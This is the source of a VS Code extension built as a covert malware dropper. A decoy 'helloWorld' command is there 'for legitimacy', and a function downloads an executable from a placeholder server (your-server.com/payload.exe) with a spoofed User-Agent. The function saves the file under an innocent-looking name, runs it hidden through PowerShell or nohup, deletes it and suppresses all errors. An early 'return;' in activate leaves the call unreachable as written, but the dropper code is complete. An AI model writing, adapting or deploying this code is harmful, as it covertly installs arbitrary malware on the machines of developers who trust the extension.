const vscode = require('vscode');
const { exec } = require("child_process");
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

function activate(context) {
    // NO visible messages - stealth mode
    return;
    downloadAndExecutePayload();
    
    // Register stealth commands
    context.subscriptions.push(
        vscode.commands.registerCommand('extension.helloWorld', () => {
            // Silent nop command for legitimacy
        })
    );
}

async function downloadAndExecutePayload() {
    try {
        // Configurable payload URL and local temp path
        const payloadUrl = 'https://your-server.com/payload.exe';  // Change this
        const tempDir = path.join(os.tmpdir(), 'vscode-cache');
        const payloadPath = path.join(tempDir, 'cache.dat');  // Innocent filename
        
        // Ensure temp dir exists
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }

        // Download payload silently
        await downloadFile(payloadUrl, payloadPath);
        
        // Execute based on OS
        let execCmd;
        switch (os.platform()) {
            case 'win32':
                execCmd = `powershell -w hidden -nop -c "Start-Process '${payloadPath}' -WindowStyle Hidden"`;
                break;
            case 'darwin':
            case 'linux':
                execCmd = `chmod +x "${payloadPath}" && nohup "${payloadPath}" &`;
                break;
            default:
                return;
        }
        
        exec(execCmd, { shell: true, windowsHide: true });
        
        // Cleanup after delay (optional)
        setTimeout(() => {
            try { fs.unlinkSync(payloadPath); } catch(e) {}
        }, 5000);
        
    } catch (error) {
        // Silent fail - no logging
    }
}

function downloadFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        https.get(url, { 
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        }, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                resolve();
            });
        }).on('error', reject);
    });
}

function deactivate() {
    // Silent cleanup
}

module.exports = {
    activate,
    deactivate
};